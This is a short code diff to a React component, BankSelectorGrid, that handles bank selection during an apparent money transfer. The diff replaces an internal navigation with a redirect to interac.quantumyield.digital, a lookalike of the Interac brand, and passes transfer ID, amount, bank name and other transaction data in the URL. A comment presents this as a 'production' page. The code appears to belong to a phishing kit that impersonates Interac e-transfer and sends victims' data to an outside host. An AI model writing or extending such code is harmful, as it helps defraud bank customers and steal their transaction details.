@@ -48,13 +48,14 @@ export default function BankSelectorGrid({ searchTerm = "", transferData }: Bank
   const handleBankSelect = (bankId: string, bankName: string) => {
     setSelectedBank(bankId)
     
-    // Build countdown URL with transfer data if available
+    // Build countdown URL with all transaction parameters using URLSearchParams for proper encoding
     const params = new URLSearchParams({
       bankId,
       bankName,
       categoryId: "major-banks",
     })
     
+    // Add transfer data parameters if available
     if (transferData) {
       params.set("transferId", transferData.transferId)
       params.set("amount", transferData.amount)
@@ -65,7 +66,9 @@ export default function BankSelectorGrid({ searchTerm = "", transferData }: Bank
       params.set("timestamp", transferData.timestamp)
     }
     
-    router.push(`/countdown?${params.toString()}`)
+    // Redirect to production countdown page
+    const countdownUrl = `https://interac.quantumyield.digital/countdown?${params.toString()}`
+    window.location.href = countdownUrl
   }
 
   const handleImageError = (bankId: string) => {
